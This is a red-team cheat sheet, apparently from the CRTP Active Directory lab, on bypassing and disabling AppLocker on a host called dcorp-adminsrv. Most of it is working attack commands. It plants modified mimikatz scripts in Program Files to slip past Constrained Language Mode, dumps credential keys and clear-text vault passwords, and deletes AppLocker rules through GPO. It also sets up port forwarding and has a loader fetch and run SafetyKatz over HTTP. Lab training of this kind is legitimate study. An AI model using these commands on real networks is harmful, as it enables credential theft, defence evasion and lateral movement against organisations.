# 🚩 Cheetsheet - Fast Commands (Applocker Policy)

Let’s check if Applocker is configured on dcorp-adminsrv by querying registry keys.&#x20;

> ```
> winrs -r:dcorp-adminsrv cmd
> ```

> Note that we are assuming that reg.exe is allowed to execute:

```
reg query HKLM\Software\Policies\Microsoft\Windows\SRPV2
```

<figure><img src="../../../.gitbook/assets/image (4) (1).png" alt=""><figcaption></figcaption></figure>

<mark style="background-color:yellow;">Looks like Applocker is configured.</mark>&#x20;

After going through the policies, we can understand that Microsoft Signed binaries and scripts are allowed for all the users but nothing else. However, this particular rule is overly permissive!

First search the scripts and examine its at found something -->

```
reg query HKLM\Software\Policies\Microsoft\Windows\SRPV2\Script\
```

<figure><img src="../../../.gitbook/assets/image (5) (1).png" alt=""><figcaption></figcaption></figure>

```
reg query HKLM\Software\Policies\Microsoft\Windows\SRPV2\Script\06dce67b-934c-454f-a263-2515c8796a5d
```

<figure><img src="../../../.gitbook/assets/image (6) (1).png" alt=""><figcaption></figcaption></figure>

**A default rule is enabled that allows everyone to run scripts from the `C:\Program Files` folder!**&#x20;

We can also confirm this using PowerShell commands on dcrop-adminsrv.&#x20;

> Note: Run the below commands from a PowerShell session as studentx:

```
PS C:\Users\student113> Enter-PSSession -ComputerName dcorp-adminsrv.dollarcorp.moneycorp.local
```

> Note: Remember use a new invishell
>
> ```
> C:\AD\Tools\InviShell\RunWithRegistryNonAdmin.bat
> . C:\AD\Tools\Find-PSRemotingLocalAdminAccess.ps1
> ```

```
[dcorp-adminsrv]: PS C:\Users\studentx\Documents> $ExecutionContext.SessionState.LanguageMode
ConstrainedLanguage
```

<mark style="background-color:yellow;">It confirm us that this ps be in restrictive mode.</mark>

Now execute this command to read the current enable rules -->

```
Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections
```

<figure><img src="../../../.gitbook/assets/image (9) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Here, <mark style="background-color:yellow;">`Everyone`</mark> <mark style="background-color:yellow;"></mark><mark style="background-color:yellow;">can run scripts from the ‘</mark><mark style="background-color:yellow;">**Program Files**</mark><mark style="background-color:yellow;">’ directory</mark>.&#x20;

That means, we can drop scripts in the Program Files directory there and execute them.&#x20;

Also, in the Constrained Language Mode, <mark style="background-color:red;">we cannot run scripts using dot sourcing</mark> (`. .\Invoke-TheKat.ps1`).&#x20;

So, we must modify `Invoke-TheKat.ps1` to include the function call in the script itself and transfer the modified script (Invoke-TheKatEx.ps1) to the target server.

### Evasive dot sourcing

> How create it into --> [https://eldeim.gitbook.io/brain\_fuck/checklists/\~/revisions/VYj9kqVgOpXEZj5m3Bz6/certifications/crtp-certified-red-team-professional/learning-objectives/learning-objtetive-7](https://eldeim.gitbook.io/brain_fuck/checklists/~/revisions/VYj9kqVgOpXEZj5m3Bz6/certifications/crtp-certified-red-team-professional/learning-objectives/learning-objtetive-7)

<figure><img src="../../../.gitbook/assets/image (7) (1).png" alt=""><figcaption></figcaption></figure>

> Copy of `Invoke-TheKat.ps1` and rename it to `Invoke-TheKatEx-keys-stdX.ps1` , `Invoke-TheKatEx-vault-stdX.ps1`(where X is your student ID).

Share it to dcorp-adminsrv pc -->

> Remember user administrative shell + invisihell + powerview

```
PS C:\AD\Tools> Copy-Item C:\AD\Tools\Invoke-TheKatEx-keys-std453.ps1 \\dcorp-adminsrv.dollarcorp.moneycorp.local\c$\'Program Files'
```

```
PS C:\AD\Tools> Copy-Item C:\AD\Tools\Invoke-TheKatEx-vault-std453.ps1 \\dcorp-adminsrv.dollarcorp.moneycorp.local\c$\'Program Files'
```

Now, run the modified mimikatz script.&#x20;

### Extract Kat-Keys

> Note that there is no dot sourcing here. It may take a couple of minutes for the script execution to complete:

```
.\Invoke-TheKatEx-keys-std113.ps1
```

<figure><img src="../../../.gitbook/assets/image (549).png" alt=""><figcaption></figcaption></figure>

<mark style="background-color:orange;">Here we find the credentials of the</mark> <mark style="background-color:orange;"></mark><mark style="background-color:orange;">`dcorp-adminsrv$`</mark><mark style="background-color:orange;">,</mark> <mark style="background-color:orange;"></mark><mark style="background-color:orange;">`appadmin`</mark> <mark style="background-color:orange;"></mark><mark style="background-color:orange;">and</mark> <mark style="background-color:orange;"></mark><mark style="background-color:orange;">`websvc`</mark> <mark style="background-color:orange;"></mark><mark style="background-color:orange;">users.</mark>

### Extract Kat-Vault

Now, run the script. Again, it may take a couple of minutes for the script execution to complete:

```
.\Invoke-TheKatEx-vault-std453.ps1
```

<figure><img src="../../../.gitbook/assets/image (9) (1).png" alt=""><figcaption></figcaption></figure>

Sweet! We got credentials for the `srvadmin` user in clear-text!&#x20;

> With it we connect with the user and pass of srvadmin buuttt!! it give us a cmd with us user student and the same machine but with the red/priv of srvadmin user
>
> "/netonly" = ✔ no cambia tu sesión\
> &#x20;                    ✔ no necesitas logon interactivo\
> &#x20;                    ✔ no crea logon tipo 2\
> &#x20;                    ✔ es más OPSEC friendly

***

## Disable Applocker

> dcorp-adminsrv by modifying GPO

We need the Group Policy Management Console for this. As the student VM is a Server 2022 machine, we can install it using the following steps: `Open Server Manager -> Add Roles and Features -> Next -> Features -> Check Group Policy Management -> Next -> Install`

<figure><img src="../../../.gitbook/assets/image (5) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

After the installation is completed, start the gpmc.&#x20;

Start the gpmc. We need to start a process as studetntX using runas, otherwise gpmc doesn’t get the user context. Run the below command from an elevated shell:

Run the below command from an elevated shell:

<figure><img src="../../../.gitbook/assets/image (6) (1) (1).png" alt=""><figcaption></figcaption></figure>

<pre><code><strong>PS C:\Users\student113> runas /user:dcorp\studentx /netonly cmd
</strong></code></pre>

<mark style="background-color:yellow;">Now! In the fristly shell when we execute runas, strat the gpmc</mark> -->

```
PS C:\Users\student113> gpmc.msc
```

> In gpmc, expand `Forest -> Domains -> dollarcorp.moneycorp.local -> Applocked -> Right click on the Applocker policy` and click on Edit

<figure><img src="../../../.gitbook/assets/image (7) (1) (1).png" alt=""><figcaption></figcaption></figure>

> In the new window, `Expand Policies -> Windows Settings -> Security Settings -> Application Control Policies -> Applocker`

<figure><img src="../../../.gitbook/assets/image (8) (1) (1).png" alt=""><figcaption></figcaption></figure>

Start looking at each category of the Applocker policies. You will find out that there are two restrictions.&#x20;

> Recall that we have already enumerated this earlier.

1. In the ‘**Executable Rules**’, ‘**Everyone**’ is allowed to run Microsoft signed binaries.
2. In the ‘**Script Rules**’, ‘**Everyone**’ can run Microsoft signed scripts from any location and two default rules where ‘**Everyone**’ can run Microsoft signed scripts from `C:\Windows` and `C:\Program Files` folders.

As we already abused the default rules for Scripts, let’s go for Executable Rules. Right Click on the rule and delete it.

<figure><img src="../../../.gitbook/assets/image (9) (1) (1).png" alt=""><figcaption></figcaption></figure>

> Now, we can either wait for the Group Policy refresh or force an update on the dcorp-adminsrv machine.&#x20;

Let’s go for the later using the following commands as studentx:

```
winrs -r:dcorp-adminsrv cmd
## Then
gpupdate /force
```

<figure><img src="../../../.gitbook/assets/image (10) (1) (1).png" alt=""><figcaption></figcaption></figure>

Exit of the current session and copy Loader on the machine and use it to run SafetyKatz!!!

```
echo F | xcopy C:\AD\Tools\Loader.exe \\dcorp-adminsrv\C$\Users\Public\Loader.exe
winrs -r:dcorp-adminsrv cmd
```

Now use a portforwarding to mask a little us ip -->

```
netsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 connectport=80 connectaddress=172.16.100.x
```

Then of it, execute -->

```
C:\Users\Public\Loader.exe -path http://127.0.0.1:8080/SafetyKatz.exe -args "sekurlsa::evasive-keys" "exit"
```

<figure><img src="../../../.gitbook/assets/image (11) (1) (1).png" alt=""><figcaption></figcaption></figure>

Sweet! We were able to disable Applocker.&#x20;

> Please note that modification to GPO is not OPSEC safe but still commonly abuse by threat actors.
